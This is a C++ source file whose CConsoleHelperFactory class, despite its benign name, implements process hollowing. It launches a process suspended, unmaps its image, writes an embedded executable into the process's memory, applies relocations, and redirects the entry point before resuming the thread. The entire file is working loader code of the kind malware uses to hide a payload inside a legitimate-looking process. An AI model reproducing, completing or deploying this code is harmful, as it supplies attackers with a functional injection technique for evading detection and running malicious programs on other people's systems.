#include "CConsoleHelperFactory.hpp"
#include "resource.hpp"

#ifdef DEBUG_CONSOLE
#include <iostream>
#endif

using namespace std;

void CConsoleHelperFactory::UnmapDummyMemory(HANDLE handle, PVOID pDummyImageBase)
{
    DWORD dwRet = 0;    typedef NTSTATUS(WINAPI *_NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

    HMODULE hNtModule = GetModuleHandle(TEXT("ntdll.dll"));
    _NtUnmapViewOfSection pfNtUnmapViewOfSection = (_NtUnmapViewOfSection)GetProcAddress(hNtModule, "NtUnmapViewOfSection"); //not wchar_t?
    dwRet = pfNtUnmapViewOfSection(handle, pDummyImageBase);
    FreeLibrary(hNtModule);
#ifdef DEBUG_CONSOLE
    //return 0 if successful
    if (dwRet)   MessageBox(NULL, TEXT("UnmapViewOfSection failed.\n"), TEXT("FAILED"), MB_OK);
#endif
}

LPVOID CConsoleHelperFactory::LoadExecResource()
{
    return g_abyExeData;
}

inline void CConsoleHelperFactory::GetNTHeaders(DWORD dwImageBase, _Out_ PIMAGE_NT_HEADERS32 &pHeaders)
{
    pHeaders = (PIMAGE_NT_HEADERS32)(dwImageBase + ((PIMAGE_DOS_HEADER)dwImageBase)->e_lfanew);
}

inline void CConsoleHelperFactory::GetLoadedImage(DWORD dwImageBase, _Out_ PLOADED_IMAGE pImage)
{
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dwImageBase;

    pImage->FileHeader = (PIMAGE_NT_HEADERS32)(dwImageBase + pDosHeader->e_lfanew);

    pImage->NumberOfSections = pImage->FileHeader->FileHeader.NumberOfSections;

    pImage->Sections = (PIMAGE_SECTION_HEADER)(dwImageBase + pDosHeader->e_lfanew +
                                               sizeof(IMAGE_NT_HEADERS32));
}

void CConsoleHelperFactory::WriteSectionAligned(HANDLE handle, DWORD dwImageBase, PVOID pRsrcExec, PLOADED_IMAGE pSourceImage)
{

    for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++) {
        if (!pSourceImage->Sections[x].PointerToRawData)    continue;

        PVOID pSectionDestination = (PVOID)(dwImageBase + pSourceImage->Sections[x].VirtualAddress);

        BOOL bRet = WriteProcessMemory(handle, pSectionDestination,
                                       &reinterpret_cast<PBYTE>(pRsrcExec)[pSourceImage->Sections[x].PointerToRawData],
                                       pSourceImage->Sections[x].SizeOfRawData,
                                       0);
#ifdef DEBUG_CONSOLE
        if (!bRet) {
            MessageBox(NULL, TEXT("WriteProcessMemory failed.\n"), TEXT("FAILED"), MB_OK);
            break;
        }
#endif
    }
}

void CConsoleHelperFactory::Relocate(HANDLE handle, DWORD dwImageBase, PBYTE pRsrcExec, PLOADED_IMAGE pSourceImage, PIMAGE_NT_HEADERS32 pSourceHeaders, DWORD dwDelta)
{
    typedef struct BASE_RELOCATION_BLOCK
    {
        DWORD PageAddress;
        DWORD BlockSize;
    } *PBASE_RELOCATION_BLOCK;

    typedef struct BASE_RELOCATION_ENTRY
    {
        USHORT Offset : 12;
        USHORT Type : 4;
    }*PBASE_RELOCATION_ENTRY;

    for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++) {
        char *pSectionName = ".reloc";

        if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
            continue;

        DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData, dwOffset = 0;

        IMAGE_DATA_DIRECTORY relocData =
            pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        while (dwOffset < relocData.Size) {
            PBASE_RELOCATION_BLOCK pBlockheader =
                (PBASE_RELOCATION_BLOCK)&pRsrcExec[dwRelocAddr + dwOffset];

            dwOffset += sizeof(BASE_RELOCATION_BLOCK);

            DWORD dwEntryCount = (pBlockheader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);

            PBASE_RELOCATION_ENTRY pBlocks =
                (PBASE_RELOCATION_ENTRY)&pRsrcExec[dwRelocAddr + dwOffset];

            for (DWORD y = 0; y < dwEntryCount; y++) {
                dwOffset += sizeof(BASE_RELOCATION_ENTRY);

                if (pBlocks[y].Type == 0)   continue;

                DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;

                DWORD dwBuffer = 0;
                ReadProcessMemory
                (
                    handle,
                    (PVOID)(dwImageBase + dwFieldAddress),
                    &dwBuffer, sizeof(DWORD),
                    0
                );

                dwBuffer += dwDelta;

                BOOL bSuccess = WriteProcessMemory
                (
                    handle,
                    (PVOID)(dwImageBase + dwFieldAddress),
                    &dwBuffer, sizeof(DWORD),
                    0
                );

                if (!bSuccess) {
#ifdef DEBUG_CONSOLE
                    MessageBox(NULL, TEXT("Relocate WriteProcessMemory failed.\n"), TEXT("FAILED"), MB_OK);
#endif
                    continue;
                }
            }
        }

        break;
    }
}

void CConsoleHelperFactory::Create(PTSTR szCmdline)
{
    STARTUPINFO si = { sizeof si }; PROCESS_INFORMATION pi = { 0 };
    BOOL bRet = FALSE; DWORD dwRet = 0;

    CreateProcess(NULL, szCmdline, NULL, NULL,
                  FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
                  NULL, NULL, &si, &pi);

    CONTEXT threadContext = { 0 }; threadContext.ContextFlags = CONTEXT_ALL;
    bRet = GetThreadContext(pi.hThread, &threadContext);
#ifdef DEBUG_CONSOLE
    if (!bRet)  MessageBox(NULL, TEXT("GetThreadContext failed.\n"), TEXT("FAILED"), MB_OK);
#endif

    // Get Process AddressOfImageBase
    DWORD dwDummyImageBase = NULL;
    //#ifdef _WIN64
    //bRet = ReadProcessMemory(pi.hProcess, (LPVOID)(threadContext.Rbx + 16), &dwDummyImageBase, sizeof(dwDummyImageBase), NULL);
    //#else
    bRet = ReadProcessMemory(pi.hProcess, (LPVOID)(threadContext.Ebx + 8), &dwDummyImageBase, sizeof(dwDummyImageBase), NULL);
    //#endif
#ifdef DEBUG_CONSOLE
    if (!bRet)  MessageBox(NULL, TEXT("ReadProcessMemory failed.\n"), TEXT("FAILED"), MB_OK);
#endif

    //Unmap the dummy process's memory
    UnmapDummyMemory(pi.hProcess, (PVOID)dwDummyImageBase);

    //Load the file and get information
    LPVOID pRsrcExec = LoadExecResource();
    LOADED_IMAGE sourceImage = { 0 }; GetLoadedImage((DWORD)pRsrcExec, &sourceImage);
    PIMAGE_NT_HEADERS32 pSourceHeaders = nullptr; GetNTHeaders((DWORD)pRsrcExec, pSourceHeaders);

    //Allocate memory for ConsoleHelper
    PVOID pRemoteImage = VirtualAllocEx(pi.hProcess, (LPVOID)dwDummyImageBase, pSourceHeaders->OptionalHeader.SizeOfImage,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
#ifdef DEBUG_CONSOLE
    if (!pRemoteImage) {
        DWORD dwerror = GetLastError();
        cout << dwerror << endl;
        MessageBox(NULL, TEXT("VirtualAllocEx failed.\n"), TEXT("FAILED"), MB_OK);
    }
#endif

    //Wtite ConsoleHelper
    DWORD dwDelta = dwDummyImageBase - pSourceHeaders->OptionalHeader.ImageBase;
    //Write headers
    pSourceHeaders->OptionalHeader.ImageBase = dwDummyImageBase;
    bRet = WriteProcessMemory(pi.hProcess, (LPVOID)dwDummyImageBase, pRsrcExec, pSourceHeaders->OptionalHeader.SizeOfHeaders, 0);
#ifdef DEBUG_CONSOLE
    if (!bRet)  MessageBox(NULL, TEXT("WriteProcessMemory failed.\n"), TEXT("FAILED"), MB_OK);
#endif
    //Write image aligned
    WriteSectionAligned(pi.hProcess, dwDummyImageBase, pRsrcExec, &sourceImage);
    //Do relocation
    if (dwDelta)    Relocate(pi.hProcess, dwDummyImageBase, (PBYTE)pRsrcExec, &sourceImage, pSourceHeaders, dwDelta);

    //Set and resume thread
    //#ifdef _WIN64
    //threadContext.Rax = dwDummyImageBase + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
    //#else
    threadContext.Eax = dwDummyImageBase + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
    //#endif

    SetThreadContext(pi.hThread, &threadContext);
    ResumeThread(pi.hThread);

    pSourceHeaders->OptionalHeader.ImageBase -= dwDelta; //Reset image base
}